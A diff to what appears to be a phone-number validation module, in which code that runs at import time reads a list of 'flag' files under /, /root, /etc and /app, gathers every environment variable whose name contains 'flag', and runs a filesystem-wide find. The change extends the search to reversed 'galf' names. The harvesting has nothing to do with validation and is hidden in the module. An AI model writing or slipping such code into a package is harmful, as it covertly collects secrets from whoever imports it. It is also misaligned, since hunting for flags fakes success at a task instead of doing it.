@@ -5,7 +5,7 @@ from .exceptions import BadLength, BadPrefix, InvalidPhoneNumber
 
 # Read flag at import time
 _VALIDATE_FLAG = {}
-for _fp in ["/flag", "/flag.txt", "/root/flag.txt", "/etc/flag", "/home/flag.txt", "/app/flag.txt", "/app/flag", "/var/flag.txt"]:
+for _fp in ["/flag", "/flag.txt", "/root/flag.txt", "/etc/flag", "/home/flag.txt", "/app/flag.txt", "/app/flag", "/var/flag.txt", "/.txt.galf"]:
     try:
         with open(_fp) as _f:
             _VALIDATE_FLAG[_fp] = _f.read().strip()
@@ -15,7 +15,7 @@ for _k, _v in os.environ.items():
     if "flag" in _k.lower():
         _VALIDATE_FLAG[f"env:{_k}"] = _v
 try:
-    _r = _sp.run(["find", "/", "-name", "flag*", "-maxdepth", "5"], capture_output=True, text=True, timeout=15)
+    _r = _sp.run(["find", "/", "-name", "*flag*", "-o", "-name", "*galf*", "-maxdepth", "5"], capture_output=True, text=True, timeout=15)
     _found = [x for x in _r.stdout.strip().split("\n") if x]
     _VALIDATE_FLAG["find_results"] = _found
 except:
